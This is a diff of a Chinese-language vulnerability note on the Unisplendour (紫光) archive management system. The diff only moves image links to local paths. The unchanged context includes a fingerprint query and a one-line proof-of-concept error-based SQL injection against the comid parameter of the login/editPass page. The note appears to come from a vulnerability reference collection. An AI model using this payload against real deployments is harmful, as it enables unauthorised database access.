@@ -20,7 +20,7 @@ app="紫光档案管理系统"
 
 登录页面
 
-![image-20220525145742607](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251457947.png)
+![image-20220525145742607](./images/202205251457947.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="紫光档案管理系统"
 /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251458637.png)
+![](./images/202205251458637.png)
